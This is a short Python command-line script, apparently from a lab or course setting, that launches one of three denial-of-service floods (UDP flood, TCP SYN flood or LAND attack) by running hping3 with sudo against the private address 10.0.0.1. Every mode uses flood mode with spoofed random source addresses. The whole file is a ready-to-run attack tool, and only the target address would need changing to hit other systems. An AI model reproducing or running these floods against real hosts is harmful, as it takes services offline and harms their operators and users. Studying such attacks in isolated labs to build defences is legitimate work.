import subprocess
import argparse
"""
            FOCUS  ATTACKS:          
DDOS > Bandwidth Depletion Attack > Protocol Exploit Attack > UDP
DDOS> Resource Depletion Attack > Protocol Exploit Attack > TCP SYN
DDOS> Resource Depletion Attack > Malformed Packet Attack > LAND

"""
parser = argparse.ArgumentParser()
#Establishing CLI optiond for: 3 forms of DDoS attack options
 
parser.add_argument("-u", "--UDPFlood", action="store_true", help="DDOS form: UDP Flooding via Hping3")
parser.add_argument("-t", "--TCPSYN", action="store_true", help="DDOS form: TCP SYN ACK via Hping3")
parser.add_argument("-l", "--LAND", action="store_true", help="DDOS form: local Area Network Denial via Hping3")

args = parser.parse_args()

if args.UDPFlood:
    print('\n----------Establishing DDoS: UDP FLOODING via Hping3....----------\n')
    result = subprocess.run(["sudo","hping3", "--udp", "--flood", "-d", "1472", "--rand-source", "10.0.0.1"])
    print(result)  
    
elif args.TCPSYN:
    print('\n----------Establishing DDoS: TCP SYN FLOODING via Hping3....----------\n')
    result = subprocess.run(["sudo","hping3", "-c", "10000", "-d", "120", "-S", "-w", "64", "-p", "80", "--flood", "--rand-source", "10.0.0.1"])
    print(result)  
    
elif args.LAND:
    print('\n----------Establishing DDoS: LAND Attack via Hping3....----------\n')
    result = subprocess.run(["sudo","hping3", "-V", "-c", "10000", "-d", "120", "-S", "-w", "64", "-p", "445", "-s", "445", "--flood", "--rand-source", "10.0.0.1"])
    print(result)   
    
